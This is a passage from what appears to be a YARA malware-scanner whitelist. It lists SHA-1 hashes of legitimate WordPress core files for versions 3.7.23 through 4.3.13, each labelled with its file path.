        hash.sha1(0, filesize) == "e291505c0ea7b45d4d70aa19de8195750cff3825" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "6b45b6dae7bac47c15a8538ee10582b353fa248f" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "7fa4d3a0d849e5557de04b94d91f91b5cad5ddfa" or // wp-admin/includes/file.php

        /* Wordpress 3.7.23 */
        hash.sha1(0, filesize) == "b059fcf32621657b4e50cffceb8646a37d69b2be" or // wp-includes/post.php

        /* Wordpress 3.8 */
        hash.sha1(0, filesize) == "19e345ce751ddcd3b036252b413ad5cd6d0f127c" or // wp-includes/post.php
        hash.sha1(0, filesize) == "aa07c8cec8a7214c1e1b14eadef6d11f656e858d" or // wp-admin/custom-header.php
        hash.sha1(0, filesize) == "234cc52d42912c81b494f698499241a784911b2c" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "ef00b087c2944e24ea589f19f6ec17183ccd7447" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "a7a1f9c36bfb60e34620639cca09b1c9198c0cc2" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "079335e8296897d75a97967c248b05171d67f7a1" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "188a34ebe732ee2aa8027af319509b5f352afde3" or // wp-includes/js/tinymce/wp-tinymce.js.gz
        hash.sha1(0, filesize) == "9e4fbae9453aa25551c886a0a127b0f072f7da9f" or // wp-includes/class-wp-editor.php

        /* Wordpress 3.8.2 */
        hash.sha1(0, filesize) == "640d250a9d5e4f2f38afb1b6d07297965ce7c557" or // wp-includes/post-template.php

        /* Wordpress 3.8.3 */
        hash.sha1(0, filesize) == "517daad9762c862a2b8112b0ded22892885c2244" or // wp-admin/includes/upgrade.php

        /* Wordpress 3.8.5 */
        hash.sha1(0, filesize) == "02deec16585c82504767b7335f3a00e5b238dd37" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "f39d1dc39f80d5dc44f6c8db061af352f00e836f" or // wp-includes/formatting.php

        /* Wordpress 3.8.6 */
        hash.sha1(0, filesize) == "82b96060eaf3669d8fdb6633679009657fc30b0f" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "38df98c4279883552cca8d75c582e48fd402a159" or // wp-includes/class-wp-editor.php

        /* Wordpress 3.8.8 */
        hash.sha1(0, filesize) == "5a8f18a9baffe6e13f3b51b3a7ffdbdc29877b9a" or // wp-admin/includes/upgrade.php

        /* Wordpress 3.8.9 */
        hash.sha1(0, filesize) == "5e72416a4b7543296e324a0130cb89c936df80fc" or // wp-includes/formatting.php

        /* Wordpress 3.8.10 */
        hash.sha1(0, filesize) == "397857a549a3bbb72372db4a39b67b0a5b0260ef" or // wp-includes/post.php
        hash.sha1(0, filesize) == "837d3165fdd6fa4bf3d56780a34ab33577fc248f" or // wp-includes/formatting.php

        /* Wordpress 3.8.15 */
        hash.sha1(0, filesize) == "b9c3c902217ba8f3bef52c395f7c0a83e279bd83" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "19cec1b0fffcb657dd976bb06e5b42e19ac2737c" or // wp-includes/formatting.php

        /* Wordpress 3.8.18 */
        hash.sha1(0, filesize) == "b978afc28451154bb7a693c565ef8b19f5bc6ae7" or // wp-admin/press-this.php

        /* Wordpress 3.8.22 */
        hash.sha1(0, filesize) == "6a91923acf188109acc2e5a30fda23881c55cc32" or // wp-admin/includes/template.php

        /* Wordpress 3.8.23 */
        hash.sha1(0, filesize) == "de642bb90ada3f41f206f396313e25816e5d8f7c" or // wp-includes/post.php

        /* Wordpress 3.9 */
        hash.sha1(0, filesize) == "fdade6ea8a0c9c3b7eb1de998985d50e57706329" or // wp-includes/post.php
        hash.sha1(0, filesize) == "d530843be2d501a131ff6b915a85e734cf97db26" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "5059267dfc14937e66f7d851633da471e709157d" or // wp-admin/custom-header.php
        hash.sha1(0, filesize) == "981639d262d8852f3af27841751bdc47af0ad91f" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "3b1f18ebfce502e1ff780869353124f8e906c722" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "b4066590d499d3fbbe16a039c397268044ba2966" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "123756694a70b3173df430c06eb2275fefd3d5c6" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "ade19a24ee69bc819952bc8dd17e9681419bf51c" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "55e6c3a26ff8ec1c9c438b04f434ff8c07ad3147" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "912e1f61a838b655fe2abc79736c99aabd48a356" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "ad34cc6370dfbca4f266cdc47042aa63fce396aa" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "1e5c370e65525383a5e3a7b0cdcb1f11b49c3916" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "30449c531e5b3d4472b05e1563f5dfe0731247cf" or // wp-includes/deprecated.php

        /* Wordpress 3.9.1 */
        hash.sha1(0, filesize) == "fc701bec3a8b4be04b95a54554d5258e9ec53604" or // wp-admin/custom-header.php
        hash.sha1(0, filesize) == "bdb3011b2d6852961e1526902fb11bdc4ce035e6" or // wp-includes/class-wp-editor.php

        /* Wordpress 3.9.3 */
        hash.sha1(0, filesize) == "0dbcc9f00219723fe83189adb3363117a991a47a" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "ec47de2fe4f43c8854283e306af6527220f10d8a" or // wp-includes/formatting.php

        /* Wordpress 3.9.4 */
        hash.sha1(0, filesize) == "967bb47c3c907d1eb7680d1336038dba72c889b1" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "7f0881182c770cce1e2ed83db5f9bc5d6dbe38c2" or // wp-includes/class-wp-editor.php

        /* Wordpress 3.9.6 */
        hash.sha1(0, filesize) == "b74a69b22dc896d893284007ec39a63f743e758a" or // wp-admin/includes/upgrade.php

        /* Wordpress 3.9.7 */
        hash.sha1(0, filesize) == "43cebf89b4f38592f6132ecea1ba941912a186de" or // wp-includes/formatting.php

        /* Wordpress 3.9.8 */
        hash.sha1(0, filesize) == "4f88a52e8ad9bfc95937c77c8caa5f1f04142f13" or // wp-includes/post.php
        hash.sha1(0, filesize) == "90d6097ca320df378e5479bfec559fee6f55668f" or // wp-includes/formatting.php

        /* Wordpress 3.9.13 */
        hash.sha1(0, filesize) == "fe58d69d790416da4bbdb6a55e323063834f4648" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "6a6a2a2780939a09d5764a3815851ff88d3c9aea" or // wp-includes/formatting.php

        /* Wordpress 3.9.14 */
        hash.sha1(0, filesize) == "56fb3cb81757e66eb09155b6529df8a4366dca58" or // wp-admin/includes/media.php

        /* Wordpress 3.9.15 */
        hash.sha1(0, filesize) == "20beff7a3a3b5644effe66a30a4a209a836661c0" or // wp-admin/includes/media.php

        /* Wordpress 3.9.16 */
        hash.sha1(0, filesize) == "17cf762e729f48b930c929e2c9b5f0fc8621c267" or // wp-admin/press-this.php

        /* Wordpress 3.9.17 */
        hash.sha1(0, filesize) == "62cab072dbad806cc40627261262bf7299caf21c" or // wp-admin/includes/media.php

        /* Wordpress 3.9.18 */
        hash.sha1(0, filesize) == "a899b606190b530dc5f12b1e8cfad8d84ac97285" or // wp-admin/includes/media.php

        /* Wordpress 3.9.19 */
        hash.sha1(0, filesize) == "1b28e79f006324fbe2b300a6ea743405ac438cad" or // wp-admin/includes/file.php

        /* Wordpress 3.9.20 */
        hash.sha1(0, filesize) == "ba73fa0db433dd6181a2ecf075fa634561e2545d" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "c33820caed04d7139d7581dcff20f50a2de25641" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "3c191f8de29dea67e78bfc52c8faf0562ecad260" or // wp-admin/includes/file.php

        /* Wordpress 3.9.21 */
        hash.sha1(0, filesize) == "988f8b36156f09622ac727a68d44e97116c34454" or // wp-includes/post.php

        /* Wordpress 4.0 */
        hash.sha1(0, filesize) == "82e32b63daae46dd047a0aeff5e55182a8a9a247" or // wp-includes/post.php
        hash.sha1(0, filesize) == "4fb0b9d1a9b2e4c03de74095d73457817986b979" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "9304e232507d1bdfd10c2820116ff6f429355411" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "b970f1af7c9836198ed149f6557b53e1595dfc2a" or // wp-admin/custom-header.php
        hash.sha1(0, filesize) == "0fcd2d0b4b6884e2772e66eb6d078814593a1bc4" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "a983e0c54fabc75aa8eebcf507aaf3dfca8ad9d6" or // wp-includes/media.php
        hash.sha1(0, filesize) == "3c0ef307dc1b32e0f5f916511bc0df217de9d15b" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "fd9e49f9dd5452cf1b2880d9f47be0e303382ef2" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "8fc22fb5f4e8551587d0e311542134b062b5f8a1" or // wp-admin/includes/class-wp-list-table.php
        hash.sha1(0, filesize) == "4cc841961c01b4bd81dbe9972ccf39ec5c043192" or // wp-includes/query.php
        hash.sha1(0, filesize) == "d3332163c0606bec546372e1c94ee9c955522578" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "8b322e6512d24c3ad1893575c39242211b951c4b" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "97a5c2407641de70f7de8459adbacacd6b7edce5" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "07b367d691a9ef5d86c4b9832576ef206f35e625" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "21fc94443bb049bafa1e015bf3c2ec21b55900f2" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "81b49b9680bd7ba29e8b0149f7720103373e4904" or // wp-includes/deprecated.php

        /* Wordpress 4.0.1 */
        hash.sha1(0, filesize) == "1e77eaa3433ae54ee956f363a994a00525b1184f" or // wp-includes/post.php
        hash.sha1(0, filesize) == "10136f1ab8a728e2afbd04f7c80310db1a27239d" or // wp-includes/media.php
        hash.sha1(0, filesize) == "965294df03cc370d027c8ab2a1486a2187f5d8a3" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "09cd0dd0e291121d6d2c7dc319dfdfda7d44a618" or // wp-includes/formatting.php

        /* Wordpress 4.0.2 */
        hash.sha1(0, filesize) == "02a97efa5903ce2e5e0529ba8b8d87f344c289ee" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "0a7c985787c6f70d69a3ca6f6a0879a45cc3a853" or // wp-includes/class-wp-editor.php

        /* Wordpress 4.0.4 */
        hash.sha1(0, filesize) == "c559fe6c1012b8ca3924e9ad6cbf91cd40c1f47c" or // wp-admin/includes/upgrade.php

        /* Wordpress 4.0.5 */
        hash.sha1(0, filesize) == "4b840f4cc3e723e821f8b9a95cd271c529f310af" or // wp-admin/includes/upgrade.php

        /* Wordpress 4.0.6 */
        hash.sha1(0, filesize) == "65baab493816da86c38caac0f04f5c58e207513d" or // wp-includes/formatting.php

        /* Wordpress 4.0.7 */
        hash.sha1(0, filesize) == "9efaa8054acbf7558bb9458a5ab0e3f37c7a45bc" or // wp-includes/post.php
        hash.sha1(0, filesize) == "9f51202e0861eb5f47f6f158f65fec001ebafe2c" or // wp-includes/formatting.php

        /* Wordpress 4.0.8 */
        hash.sha1(0, filesize) == "6191ae4a4b1a6668f51aeba1f70e66ea1d379e26" or // wp-includes/media.php

        /* Wordpress 4.0.12 */
        hash.sha1(0, filesize) == "05aa0203e606fb851d263a7c3e5f55f5a0c95987" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "a59284e4a4dd8b95a31c7b2ae88db5b6f0bb46ee" or // wp-includes/formatting.php

        /* Wordpress 4.0.13 */
        hash.sha1(0, filesize) == "d4132a2626922fe059e64165b7151b71f13d4584" or // wp-admin/includes/media.php

        /* Wordpress 4.0.14 */
        hash.sha1(0, filesize) == "7f4c950f496d7411ca2685757f7ab843e940143b" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "cb11c7c8e84314a2500056d336eb58b7cf49a498" or // wp-includes/functions.php

        /* Wordpress 4.0.15 */
        hash.sha1(0, filesize) == "50b3e8e4e5238f6ef35f0c9441d62426238ffc0b" or // wp-includes/query.php
        hash.sha1(0, filesize) == "5dddd212c03cdd421e5a5f26cf83d0736ee4e8a5" or // wp-admin/press-this.php

        /* Wordpress 4.0.16 */
        hash.sha1(0, filesize) == "17d61ac47259e04c0a51de80c75bada5421e0af7" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "ef87ad9057d69c14d1bc57b32df2fdc51b419996" or // wp-includes/media.php

        /* Wordpress 4.0.17 */
        hash.sha1(0, filesize) == "87386ef00398bc95dcf0ea565784829b92e32c73" or // wp-admin/includes/media.php

        /* Wordpress 4.0.18 */
        hash.sha1(0, filesize) == "eca79312a2989d0a1292fb7e265568c41ea74be0" or // wp-admin/includes/file.php

        /* Wordpress 4.0.19 */
        hash.sha1(0, filesize) == "1d7f8e66bc7b7ba0f95ccf71827f0a075f2ec749" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "ce46dbe00ec0acd2e160c0070e171fc23d47e5eb" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "53cbff6d382ce43f29938e72cba0110b9b982596" or // wp-admin/includes/file.php

        /* Wordpress 4.0.20 */
        hash.sha1(0, filesize) == "ba71063229da2c60ff12b8421ee0a95412b4784a" or // wp-includes/post.php

        /* Wordpress 4.0.21 */
        hash.sha1(0, filesize) == "5047d373b97e062634d783b498345a25fea4cf00" or // wp-includes/functions.php

        /* Wordpress 4.1 */
        hash.sha1(0, filesize) == "02cee043d87d284344c66762deecea657356e781" or // wp-includes/post.php
        hash.sha1(0, filesize) == "1d3fceaeb67737f3f992da755353eedfba12e4b9" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "8f3c3c29001162345137ddea56a93498b6cad46a" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "00ae2858df9a4a13c353b3bcfadf63f3086f21d0" or // wp-admin/custom-header.php
        hash.sha1(0, filesize) == "c5bae0f590efd22edec293c66fac52b276893a04" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "354076ec60e30aeb0cae833f7ec583795fa114b0" or // wp-includes/media.php
        hash.sha1(0, filesize) == "fcb78dcbf115880ae060ef0c21d3dcb4f1cb74f6" or // wp-includes/meta.php
        hash.sha1(0, filesize) == "3e75c0e0099fe3f7ae71d837b304a11f7e572859" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "ae7515e3609d2779ab8e8fc7db7514170d56bb7f" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "899d816f539bd30aa42dc2bc0bfacee66b049e6b" or // wp-includes/date.php
        hash.sha1(0, filesize) == "b855e2330dd28c8923a88b6329752690bba5d16e" or // wp-includes/query.php
        hash.sha1(0, filesize) == "4076aef534a5cc026932aaa6d46790482935ff03" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "eb819418e10a78871f4ae134644b031b1421e112" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "e243d6e0a0d3b1a354a14f9c8180ae654c73219f" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "dbcdf3fb3abd85ff8691204e868a0d326327d3ee" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "170fcfea64689020dfb31af46193b02108858a97" or // wp-includes/taxonomy.php
        hash.sha1(0, filesize) == "d8ba2ffb89d8e6fd1a9a8dabe1cc9558c37f58e6" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "5183fdbeac6f4d0c83c17f60a72308b3dc3a5d43" or // wp-includes/deprecated.php

        /* Wordpress 4.1.1 */
        hash.sha1(0, filesize) == "e934a4b0f9cb2ba47cfa428cb10343d7d48d8431" or // wp-includes/date.php
        hash.sha1(0, filesize) == "458d3517e602b97008185d0cc49f0ffaaa0bf28c" or // wp-includes/taxonomy.php

        /* Wordpress 4.1.2 */
        hash.sha1(0, filesize) == "fa376bf871e4e90a78995a24d5b8dfd6329c2034" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "625e89b44b46c3a9a5793e2bc1fb978140f66095" or // wp-includes/class-wp-editor.php

        /* Wordpress 4.1.4 */
        hash.sha1(0, filesize) == "f1c6460e538e677661c279ef0ce65b0bc18eb913" or // wp-admin/includes/upgrade.php

        /* Wordpress 4.1.5 */
        hash.sha1(0, filesize) == "8b32b2a0dec44bbd0d5d97e4f1b26efd20d61f9b" or // wp-admin/includes/upgrade.php

        /* Wordpress 4.1.6 */
        hash.sha1(0, filesize) == "aa31ad3b27e8b7b037b2aaff685ef3fd48f5c600" or // wp-includes/formatting.php

        /* Wordpress 4.1.7 */
        hash.sha1(0, filesize) == "092dc4b0af1285499f15d13c8765bfe94a12c287" or // wp-includes/post.php
        hash.sha1(0, filesize) == "cc2fa51146cc136cfb0a2dcd84084f7a7297f977" or // wp-includes/formatting.php

        /* Wordpress 4.1.8 */
        hash.sha1(0, filesize) == "f6abf8f0104252dee182b1c8ba5a22eaeec98620" or // wp-includes/media.php

        /* Wordpress 4.1.11 */
        hash.sha1(0, filesize) == "d1067c4ca6343710c2c01426c5dd601a27108230" or // wp-includes/taxonomy.php

        /* Wordpress 4.1.12 */
        hash.sha1(0, filesize) == "f882a04b5dd0b8ade98ac751dc400c72de08fb4a" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "a34ef14ee5c1b3d94dadf7cd98c774565c77b523" or // wp-includes/formatting.php

        /* Wordpress 4.1.13 */
        hash.sha1(0, filesize) == "f74a1c5e34ac02cde591fc7de997247f4ee2ad06" or // wp-admin/includes/media.php

        /* Wordpress 4.1.14 */
        hash.sha1(0, filesize) == "53bce74420948c2b1448de107fbd960b2ea7e925" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "d089ae5d3be70327a03fe19ca65bd08eef522f23" or // wp-includes/functions.php

        /* Wordpress 4.1.15 */
        hash.sha1(0, filesize) == "0c436ad9b21445656967b841e2377fb91d5eaef9" or // wp-includes/query.php
        hash.sha1(0, filesize) == "15872b26705de36cfa3bca17311d46bed8a26cb3" or // wp-admin/press-this.php

        /* Wordpress 4.1.16 */
        hash.sha1(0, filesize) == "cb79f6dc730fb8556b930f214f91552e1e88b487" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "71a4e6b43192944d30eb317aa534e6ac66b0c4d6" or // wp-includes/media.php

        /* Wordpress 4.1.17 */
        hash.sha1(0, filesize) == "b9f3626b12baac5497ca8c085ae378ba2e88a2bf" or // wp-admin/includes/media.php

        /* Wordpress 4.1.18 */
        hash.sha1(0, filesize) == "9eadd29eb5e4ac074fb0aa2d79ba75a6f8abec32" or // wp-admin/includes/file.php

        /* Wordpress 4.1.19 */
        hash.sha1(0, filesize) == "dde667c7b2d2dfb486b717029fa2e5b231e98343" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "6356e9f524f519c44487be463568b25afbe0994f" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "143e73ae0357a0753b0100cd3faf1337b2bbeeeb" or // wp-admin/includes/file.php

        /* Wordpress 4.1.20 */
        hash.sha1(0, filesize) == "a32f064225cf2204e5cba0809710fd5beeb6bc99" or // wp-includes/post.php

        /* Wordpress 4.1.21 */
        hash.sha1(0, filesize) == "9c240b8e97bdfcadd9161e28925ecf5490c6211c" or // wp-includes/functions.php

        /* Wordpress 4.2 */
        hash.sha1(0, filesize) == "76e12317ec1285adcdc492efe71f898ccd76cc4f" or // wp-includes/post.php
        hash.sha1(0, filesize) == "8c897ac93db0620c7a4a5bba2bbc3a6d5ee1a741" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "98042c16520129851ab0ad515f7f0d7c8a04bc97" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "7b0e29a942a5d6e9541c4eff5ba4e3fc5ad2f180" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "4eb961932a223428dbb0354cba7a109d4f082069" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "8a060c75a4e994b89ddd8dd0b11393f34f7c49b5" or // wp-includes/date.php
        hash.sha1(0, filesize) == "ebe698479d1434e7afb3da1370519742e64e178f" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "9ddcac4aa1d7b51a518e83d399a66675a2758752" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "19cdb09b16b10165a92d21382eb6703f89ef20ab" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "c6de0a53dbf301eb529826b824f6537f08e51dd8" or // wp-admin/credits.php
        hash.sha1(0, filesize) == "dfc724c94a5d2b96442d7a7c311de38e30b10952" or // wp-includes/default-widgets.php
        hash.sha1(0, filesize) == "a7735baf35c981deb7ea85336cbb56f437fe2dad" or // wp-includes/taxonomy.php
        hash.sha1(0, filesize) == "4f2bad51df6f336ea3d0a3d3591bd2b4d6cedd71" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "1c91876e8ef415bc46eb7784df192d1c4394d591" or // wp-includes/meta.php

        /* Wordpress 4.2.1 */
        hash.sha1(0, filesize) == "a06f2699c21268a9b2b1e5c1f2880ac037f206f1" or // wp-admin/includes/upgrade.php

        /* Wordpress 4.2.2 */
        hash.sha1(0, filesize) == "51803cf19e419ce2c3702939acbefedf0d5607db" or // wp-includes/post.php
        hash.sha1(0, filesize) == "a88ec5f8fea806472d87b8b4fda68cd6a84e31f4" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "7e3f36fbb6b69f921b27ebec9bc7ff02dc016158" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "e7689e0b3b3dec898fe1a647a9dc3b34f96761e1" or // wp-includes/formatting.php

        /* Wordpress 4.2.5 */
        hash.sha1(0, filesize) == "57861a47a63f7ffdbfb257cd52925f0019c3e516" or // wp-includes/media.php
        hash.sha1(0, filesize) == "c5a495823473f47ae0ba451665270ee7e717de52" or // wp-admin/includes/ajax-actions.php

        /* Wordpress 4.2.8 */
        hash.sha1(0, filesize) == "f85f407e66a6dd8b1a3ec2a2a3b1a8e791f422ec" or // wp-includes/taxonomy.php

        /* Wordpress 4.2.9 */
        hash.sha1(0, filesize) == "1df1bfa4b6984284479901424a469df48e63e322" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "8e9e78a23eb3865e5578a16dcde048227ed51a91" or // wp-admin/includes/ajax-actions.php
        hash.sha1(0, filesize) == "00d52b0e666bf35211ebbad67a264f02e66984ad" or // wp-includes/formatting.php

        /* Wordpress 4.2.10 */
        hash.sha1(0, filesize) == "ae3064d1f5c1a4161c3d6f02d045c544e845fef0" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "3d75e6312f084dc7b9967e9ebd2456d79e0eea0d" or // wp-admin/includes/upgrade.php

        /* Wordpress 4.2.11 */
        hash.sha1(0, filesize) == "8110425395226f04718882986374edcf058e8071" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "1082a6b2b4f09f19191eafb79f715a2356a17c96" or // wp-includes/functions.php

        /* Wordpress 4.2.12 */
        hash.sha1(0, filesize) == "2cf8d3dc23df2912e44f80d8fe0c28e2be990a97" or // wp-includes/query.php

        /* Wordpress 4.2.13 */
        hash.sha1(0, filesize) == "925e66ad92240ab58627a499b669b4a24c4e6e3b" or // wp-includes/media.php
        hash.sha1(0, filesize) == "80fbeb35c51a6a9b5ab110d9712179b4e89f8bb2" or // wp-admin/includes/media.php

        /* Wordpress 4.2.14 */
        hash.sha1(0, filesize) == "362f722769715178d58b40e9115c930c841c2f9a" or // wp-admin/includes/media.php

        /* Wordpress 4.2.15 */
        hash.sha1(0, filesize) == "524eefb11aec7a44e797146019b15f651af6abfd" or // wp-admin/includes/file.php

        /* Wordpress 4.2.16 */
        hash.sha1(0, filesize) == "59045c43cb0c3efdc9c4e8f8baa8d8012368a299" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "a50148f6e2bfab5141ec38a99a963fe779ecae85" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "1dbeae546c632435e05021b5952856ebb148ad85" or // wp-admin/includes/file.php

        /* Wordpress 4.2.17 */
        hash.sha1(0, filesize) == "3d38f79fc4d9647b5e246293e1ae9e6d30ad3866" or // wp-includes/post.php

        /* Wordpress 4.2.18 */
        hash.sha1(0, filesize) == "9cddb65051a3957b9d9df08e0d4dbcc8904401f1" or // wp-includes/functions.php

        /* Wordpress 4.3 */
        hash.sha1(0, filesize) == "9ac361b7a5f7b4bedfa401105430ad4bbc42d703" or // wp-includes/post.php
        hash.sha1(0, filesize) == "be3ce06026587ce523757aa1b250641a7b372dc3" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "7d3d75d75f52d5c65f1e662f4df08ccb98ecdc89" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "1621e2b54e4e6662fd91f62ebe4b1faa7919db2b" or // wp-includes/media.php
        hash.sha1(0, filesize) == "41ce7e5dcc5e900cdbad71e32e178f3e4e343331" or // wp-admin/includes/ajax-actions.php
        hash.sha1(0, filesize) == "4a1897a9f8a35b872af6710a715d8a951735e25d" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "0ff072081cac324fcec8f1673c48d0050cf889fb" or // wp-includes/meta.php
        hash.sha1(0, filesize) == "eca907eb041cbd279f81668a8ccd94199b9f885b" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "7e35b47d3fb712e063811249ed40b4bccd679ef5" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "6cf363c76248948ba36d62d247f9d0341efc7fb7" or // wp-includes/taxonomy.php
        hash.sha1(0, filesize) == "c4dc6b1193ebe75ab6a3dbbb685edbbacc35e072" or // wp-includes/query.php
        hash.sha1(0, filesize) == "3be43a3712d0729b506b38b5517e8e26840231ca" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "eb5a5794ca54733861b717d99c44668fdf6f542a" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "93a22e63c422a6e8dc83299f4774559422479cc1" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "0e7b4e9dcf6b9fc737a524271f0a7297691e41bd" or // wp-includes/default-widgets.php
        hash.sha1(0, filesize) == "9701a951e8e21545a2be97302d1d234e0772f29d" or // wp-includes/deprecated.php

        /* Wordpress 4.3.1 */
        hash.sha1(0, filesize) == "b3110df406c6c4a2694c97e38122e39c7ec6577a" or // wp-includes/media.php
        hash.sha1(0, filesize) == "f97d139bdc73107b361a9e3ac728a6d9742bbcb3" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "4e49ee459af033622b44846cf7e93b3d24e5c719" or // wp-includes/taxonomy.php
        hash.sha1(0, filesize) == "22df02ddfc4d28064ac4008fb9f416941465ecb5" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "f29a9710ba563d5b197acf6eb815e5eb5a96981d" or // wp-includes/default-widgets.php

        /* Wordpress 4.3.4 */
        hash.sha1(0, filesize) == "145f0dfb8c9ea70c32a446d3b4cc3814d9efc865" or // wp-includes/taxonomy.php

        /* Wordpress 4.3.5 */
        hash.sha1(0, filesize) == "e140bb6105dbc39d2a84c7734b5748ba98f97d0f" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "2b6c539cf7c96e86751e7845cfb749ba5b0ad268" or // wp-admin/includes/ajax-actions.php
        hash.sha1(0, filesize) == "a945290f46ae8f0386e8cb8e1d052a179b7607a2" or // wp-includes/formatting.php

        /* Wordpress 4.3.6 */
        hash.sha1(0, filesize) == "1e3fe00ea43a55e0499d6485037aca6868490bd6" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "c40c86e2906587d7a94ca48505f7a01b78e73d75" or // wp-admin/includes/upgrade.php

        /* Wordpress 4.3.7 */
        hash.sha1(0, filesize) == "275331ea9d076c0d9c89616373a3e07a12ee8206" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "a5985105432f4669f865ed3f56209f5d28106801" or // wp-includes/functions.php

        /* Wordpress 4.3.8 */
        hash.sha1(0, filesize) == "e6315cf0672b295d772c25e08ed55d557f4722fa" or // wp-includes/query.php

        /* Wordpress 4.3.9 */
        hash.sha1(0, filesize) == "826cd281357fb27bcf3e1217c1f9b36e62315b6c" or // wp-includes/media.php
        hash.sha1(0, filesize) == "30877e873e61e6d4ecb9aa608e6b05d1607c3e09" or // wp-admin/includes/media.php

        /* Wordpress 4.3.10 */
        hash.sha1(0, filesize) == "663c4f356e45a72715fcdb5f863a03f007855314" or // wp-admin/includes/media.php

        /* Wordpress 4.3.11 */
        hash.sha1(0, filesize) == "7bcba0af268e5fab44ebcb1e0ec5883e9804df79" or // wp-admin/includes/file.php

        /* Wordpress 4.3.12 */
        hash.sha1(0, filesize) == "d9978f6e12240814982c90f6972ecdf58f9fb59d" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "ab037fb84ec5bdee286a97a1aed72ab69e710427" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "34ec6168c4aa8e9369d5c5bc49f09dfd83d20879" or // wp-admin/includes/file.php

        /* Wordpress 4.3.13 */
        hash.sha1(0, filesize) == "2c351d173b7ac77f56f0626d1da6430809037c09" or // wp-includes/post.php

